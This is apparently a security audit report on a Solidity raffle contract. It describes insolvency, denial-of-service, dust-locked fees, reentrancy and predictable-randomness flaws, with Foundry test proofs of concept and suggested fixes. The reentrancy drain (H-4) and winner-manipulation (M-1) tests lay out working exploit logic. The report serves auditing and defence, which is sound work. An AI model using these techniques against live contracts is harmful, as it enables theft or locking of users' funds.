### [H-1] When a player ask for a refund, the `totalAmountCollected` variable of the `selectWinner` function is not reduced, causing contract insolvency.

**Detailed Description:**

When a player calls the `refund` function to get his money back, the `players` array's size stays the same. However, the prize pool is calculating with this formula:
```javascript
totalAmountCollected = players.length * entranceFee
```

In reality, the contract balance is only `(players.length - 1) * entranceFee` because of the refund. Now if we call the `selectWinner` function, the transaction will revert on the call:
```javascript
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

This does mean that the funds are permanently locked in the contract. The only way to recover them is to send some Ether to the contract, to make its balance greater than or equal to the prize pool.

**Proof of Concept:**

Actors:
- Players: Normal players entering the raffle.

```javascript
function test_RaffleBurnPrize() public {
    // Four addresses are entering the raffle
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    // First player is refunding his ticket
    uint256 indexOfPlayerOne = puppyRaffle.getActivePlayerIndex(playerOne);
    vm.prank(playerOne);
    puppyRaffle.refund(indexOfPlayerOne);

    // We can't select a winner as the contract is insolvent
    vm.warp(block.timestamp + duration);
    vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
    puppyRaffle.selectWinner();

    // We assert that the total amount collected is greater than the contract balance
    // This means that the contract is insolvent
    uint256 totalAmountCollected = players.length * puppyRaffle.entranceFee();
    assertGt(totalAmountCollected, address(puppyRaffle).balance);
}
```

Notice: Sometimes the `selectWinner` function may work even if the contract is insolvent. This is because of the fees layout. The winner will receive his prize but the fee receiver will never be able to claim his fees, because of this require (the error string message will be irrelevant in such cases):
```
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

**Recommended Mitigation:**

Track the zero addresses inside of the players array. Make these changes inside of the `selectWinner` function:

```diff
uint256 winnerIndex =
    uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
address winner = players[winnerIndex];
+   uint256 zeroAddressCount = 0;
+   for (uint256 i = 0; i < players.length; i++) {
+       if (players[i] == address(0)) {
+           zeroAddressCount++;
+       }
+   }
-   uint256 totalAmountCollected = players.length * entranceFee;
+   uint256 totalAmountCollected = (players.length - zeroAddressCount) * entranceFee;
```

---

### [H-2] Refunding a user is zeroing its address in the `players` array, causing a revert on all the next entries if two users or more got a refund.

**Detailed Description:**

When a user is asking for a refund of his ticket, the `refund` function replaces its address by the zero address in the array, to remove his entry from the raffle. Thus, if multiple users ask for a refund in the same raffle, we will have multiple zero addresses in the array. However, when another user tries to participate to the raffle by calling the `enterRaffle` function, the contract is checking for any duplicate in the array, with this nested loop:

```javascript
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

This loop will always revert because of the multiple zero addresses inside of the `players` array, leading to 2 major issues:

1. Users will not be able to enter a raffle where 2 players asked for a refund, causing a DoS until the `players` array is cleaned through the `selectWinner` function.
2. If two participants the raffle ask for a refund before it reaches 4 players, the `selectWinner` will never be callable as needs 4 players or more to be called. The remaining player will have to call the refund function to get his funds back, and the contract will be permanently unusable.

**Proof of Concept:**

Actors:
- Players: Normal players entering the raffle.
- Attackers: Malicious players entering the raffle to create a DoS.

```javascript
function test_RaffleDoS() public {
    // First participant is entering the raffle
    address[] memory player_1 = new address[](1);
    player_1[0] = playerOne;
    puppyRaffle.enterRaffle{value: entranceFee}(player_1);

    // A group of two malicious participants are entering the raffle
    address[] memory attackers = new address[](2);
    attackers[0] = attackerOne;
    attackers[1] = attackerTwo;
    puppyRaffle.enterRaffle{value: entranceFee * 2}(attackers);

    // First attacker is refunding his ticket
    uint256 indexOfAttackerOne = puppyRaffle.getActivePlayerIndex(attackerOne);
    vm.prank(attackerOne);
    puppyRaffle.refund(indexOfAttackerOne);

    // Second attacker is refunding his ticket too
    uint256 indexOfAttackerTwo = puppyRaffle.getActivePlayerIndex(attackerTwo);
    vm.prank(attackerTwo);
    puppyRaffle.refund(indexOfAttackerTwo);

    // Another participant tries to enter the raffle,
    // but it will revert because of the duplicate zero addresses
    address[] memory player_2 = new address[](1);
    player_2[0] = playerTwo;
    vm.expectRevert("PuppyRaffle: Duplicate player");
    puppyRaffle.enterRaffle{value: entranceFee}(player_2);

    // Now there are 3 players in the raffle, and no new participant can enter the raffle
    // This does mean that we will never be able to call the selectWinner function
    vm.warp(block.timestamp + duration);
    vm.expectRevert("PuppyRaffle: Need at least 4 players");
    puppyRaffle.selectWinner();

    // Now the only way for playerOne to get his funds back is to call the refund function
    uint256 indexOfPlayerOne = puppyRaffle.getActivePlayerIndex(playerOne);
    vm.prank(playerOne);
    puppyRaffle.refund(indexOfPlayerOne);
}
```

**Recommended Mitigation:**

To mitigate this critical vulnerability, we advice the following changes on the `enterRaffle` function:
```diff
for (uint256 i = 0; i < players.length - 1; i++) {
+   if (players[i] == address(0)) continue;
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```
This will avoid checking for duplicates on zero addresses.

---

### [H-3] The `withdrawFees` function is implementing a require that may always revert because of dust, making the fees permanently lost and locked inside of the contract.

**Detailed Description:**

When a user tries to call the `withdrawFees` function, the contract will go through a require trying to check if there are any active players. To achieve that, it checks if the remaining balance of the contract is strictly equal to the `totalFees` variable. But if we check how this variable is constructed, we can see that it's incremented on every raffle inside the `selectWinner` function:
```javascript
totalFees = totalFees + uint64(fee);
```

And if we check the value of fee, we get this:
```javascript
uint256 fee = (totalAmountCollected * 20) / 100;
```
This line may cause critical issues to the fees withdrawals, because it's a mathematical formula that may truncate its result. In fact the `totalAmountCollected` variable is multiplied by a decimal number (1/5). This does mean that if `totalAmountCollected` is not a multiple of 5, the resulting fee will be truncated by the EVM.
It is the same situation for the `prizePool` formula, it may be truncated.
Now the variables will always be lower than or equal to the actual amount on Ether sent to the contract. This mean that there will always be some remaining dust and this dust will make the `withdrawFees` function revert everytime on the first require.

**Proof of Concept:**

To achieve that, we just need to change the `entranceFee` of the raffle contract. Right now the tests are successful because the fee is set to 1e18 which is leading to multiples of 5 in most cases. But if we set the variable to this value, the tests will now fail:
```javascript
uint256 entranceFee = 1e18 + 1;
```

**Recommended Mitigation:**

To mitigate this critical vulnerability, we can track if there are active users with another method. Insted of checking if the balance is strictly equal to the claimable fees, we can verify if the `players` array length is 0:
```diff
function withdrawFees() external {
-   require(address(this).balance == uint256(totalFees),
+   require(players.length == 0,
   "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

---

### [H-4] The `refund` function is not following the Checks-Effects-Interactions pattern, leading to reentrancy vulnerability.

**Detailed Description:**

The `refund` function is sending Ether to `msg.sender` before setting its address to zero in the `players` array. However, this is the only condition used by the `refund` function to check if a user already got refunded:
```javascript
require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
```

Now an attacker can use a malicious contract to call the `refund` function multiple times through a fallback function, letting him drain all the contract balance with reentrancy.

**Proof of Concept:**

Actors:
- Attacker: Malicious players deploying a contract to drain contract funds.

```javascript
function test_RaffleReentrancy() public playersEntered {
    uint256 balanceBefore = attackerOne.balance;

    // The attacker is deploying a malicious contract
    // that will call the refund function multiple times
    vm.startPrank(attackerOne);
    MaliciousContract maliciousContract = new MaliciousContract(puppyRaffle);
    vm.deal(address(maliciousContract), entranceFee);

    maliciousContract.startAttack();
    maliciousContract.withdraw();
    vm.stopPrank();
    
    uint256 balanceAfter = attackerOne.balance;
    assertEq(balanceAfter, balanceBefore + 5 * entranceFee);
}
```

**Recommended Mitigation:**

To mitigate this critical vulnerability, we need to respect the Checks-Effects-Interactions pattern. Inside of the `refund` function make these changes:
```diff
-   payable(msg.sender).sendValue(entranceFee);
+   players[playerIndex] = address(0);

-   players[playerIndex] = address(0);
+   payable(msg.sender).sendValue(entranceFee);
```

---

### [M-1] Poor RNG implementation can be exploited by attackers to choose the winner.

**Detailed Description:**

The `selectWinner` function implements a RNG for the `winnerIndex` and for the `rarity`, using the hash of 3 global variable:
```javascript
uint256 winnerIndex =
    uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % player.length;
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;

```

These numbers can easily be predicted by anyone before the transaction to be broadcasted, leading to a major vulnerability where malicious actors can call the `selectWinner` function only if they will be selected as a winner. They can also wait for the `rarity` variable to be higher than `LEGENDARY_RARITY`, in order to get minted a rare NFT.

This vulnerability is marked as Medium and not High because it is very unlikely in cases where there a lot of players taking part into the raffle. In fact, the `selectWinner` will be probably called right after the end of `raffleDuration`, and malicious actors will not have the time to wait for `block.timestamp` and `block.difficulty` to match his needs.

However `block.difficulty` can probably be manipulated by Ethereum validators and in this case it would be a critical vulnerability.

**Proof of Concept:**

Actors:
- Attackers: Malicious users exploiting the poor RNG.

```javascript
    function test_RafflePoorRNG() public playersEntered {
        // A group of two malicious participants are entering the raffle
        address[] memory attackers = new address[](2);
        attackers[0] = attackerOne;
        attackers[1] = attackerTwo;

        // Save attackers' balance before they enter the raffle
        vm.deal(attackerOne, entranceFee * 2);
        uint256 balanceBefore = attackerOne.balance + attackerTwo.balance;
        
        // Attackers enter the raffle
        vm.prank(attackerOne);
        puppyRaffle.enterRaffle{value: entranceFee * 2}(attackers);

        // Raffle duration ends
        vm.warp(block.timestamp + duration);

        // The attacker waits for the `winnerIndex` to match
        // one of the attackers' addresses
        uint256 winnerIndex = 0;
        uint256 attackerOneIndex = puppyRaffle.getActivePlayerIndex(attackerOne);
        uint256 attackerTwoIndex = puppyRaffle.getActivePlayerIndex(attackerTwo);

        // Here 
        while (winnerIndex != attackerOneIndex && winnerIndex != attackerTwoIndex) {
            // Wait next block
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 8);

            // Calculate new winnerIndex
            winnerIndex = uint256(keccak256(abi.encodePacked(
                attackerOne, block.timestamp, block.difficulty
            ))) % 6;
        }

        // Now attackers can select the winner because it will match one of their addresses
        vm.prank(attackerOne);
        puppyRaffle.selectWinner();

        // Check that attackers' balance has increased
        uint256 balanceAfter = attackerOne.balance + attackerTwo.balance;
        assertGt(balanceAfter, balanceBefore);
    }
```

**Recommended Mitigation:**

To generate a random number, the safest way is to use an external oracle.

---

### [I-1] The `_isActivePlayer` internal function is never used.

This is consuming gas by increasing compiled code size.

**Recommended Mitigation:**

Delete this function.